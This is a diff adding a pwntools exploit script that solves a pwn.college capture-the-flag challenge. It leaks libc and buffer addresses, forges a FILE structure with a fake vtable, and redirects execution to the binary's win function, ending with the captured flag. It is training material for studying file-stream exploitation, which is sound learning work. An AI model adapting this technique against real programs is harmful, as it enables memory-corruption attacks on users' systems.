@@ -1,0 +1,45 @@
+from pwn import *
+
+# this help a lot:
+# https://aneii11.github.io/p/fsop-code-execution/
+
+context.arch = 'amd64'
+
+'''
+e = ELF("./babyfile_level7_patched")
+libc = ELF("./libc6_2.31-0ubuntu9.16_amd64.so")
+'''
+e = ELF("/challenge/babyfile_level7")
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+
+script = '''
+b *challenge
+b *0x401a61
+b *fwrite
+b *fwrite+189
+'''
+
+p = process("/challenge/babyfile_level7")
+#p = gdb.debug("./babyfile_level7_patched", gdbscript = script)
+
+p.recvuntil(b"puts() within libc is: ")
+libc_base = int(p.recvline(), 16) - libc.symbols['puts']
+print(hex(libc_base))
+
+p.recvuntil(b"buffer is located at: ")
+buffer = int(p.recvline(), 16)
+
+win = e.symbols['win']
+fake_vtable = p64(0) * (0xE0//8) + p64(buffer + 0xe0 + 8 - 0x68) + p64(win)
+
+fp = FileStructure()
+fp.flags = 0xfbad2484
+fp._lock = 0x404800 # rw_section and null value 
+fp.vtable = libc_base  + 0x1e8f40 # offset of pwn.college
+fp._wide_data = buffer
+
+p.sendafter(b"name.\n", fake_vtable)
+p.sendafter(b"directly to the FILE struct.\n\n", bytes(fp))
+
+p.interactive()
+#pwn.college{oItDUDnIE9Eu2g-CH1-gsuBPMeD.dZDN0MDL2EzNyYzW}
